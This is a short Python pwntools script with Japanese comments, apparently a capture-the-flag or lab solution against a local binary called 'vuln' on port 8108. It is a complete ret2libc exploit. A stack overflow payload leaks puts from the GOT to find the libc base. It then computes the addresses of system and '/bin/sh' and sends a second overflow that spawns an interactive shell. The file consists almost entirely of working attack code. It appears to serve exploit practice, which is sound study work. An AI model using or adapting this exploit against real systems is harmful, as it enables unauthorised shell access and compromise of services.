#!/usr/bin/python3
from pwn import *
from struct import *
import hexdump

context(arch='amd64', os='linux')
elf = ELF("vuln")
libc = ELF("libc6_2.39-0ubuntu8.4_i386.so") # libc.rip を使って持ってくる

def conn():
    r = remote('localhost', 8108)
    #r = process("./vuln")
    return r

def main():
    r = conn()
    #gdb.attach(r, gdbscript='''
    #    b *vuln+66
    #    c
    #    ''')

    # 0: 最初のダンプ情報等を取得して表示
    data = r.recvuntil(b"Name? ")
    print(data.decode())
    print()

    # 1: libc リーク
    payload  = b""
    payload += b"a" * 16
    print("puts@plt:",  hex(elf.plt["puts"]))
    print("puts@got:",  hex(elf.got["puts"]))
    print("vuln:",  hex(elf.symbols["vuln"]))
    payload += pack('<I', elf.plt["puts"])  # 最初のリターンアドレス
    payload += pack('<I', elf.symbols["vuln"])
    payload += pack('<I', elf.got["puts"])
    payload += b"\n"
    r.send(payload)

    r.recvuntil(b"\n") # Nice to meet you は飛ばす
    puts_addr = r.recvuntil(b"\n")
    puts_addr = u32(puts_addr[0:4])
    libc_base = puts_addr - libc.symbols["puts"] # elf.symbols はelfのベースが固定なので絶対アドレスだが、libc.symbolsはlibcがpieなのでオフセットになるので注意
    print("puts:", hex(puts_addr))
    print("libc:", hex(libc_base))

    # 2: リークした libc ベースを元に system と "/bin/sh" のアドレスを計算
    system_addr = libc_base + libc.symbols["system"]
    binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
    print("system:", hex(system_addr))
    print("binsh:", hex(binsh_addr))

    # 3: シェル起動
    payload  = b""
    payload += b"a" * 16
    payload += pack('<I', system_addr)
    payload += pack('<I', elf.symbols["vuln"])
    payload += pack('<I', binsh_addr)
    payload += b"\n"
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
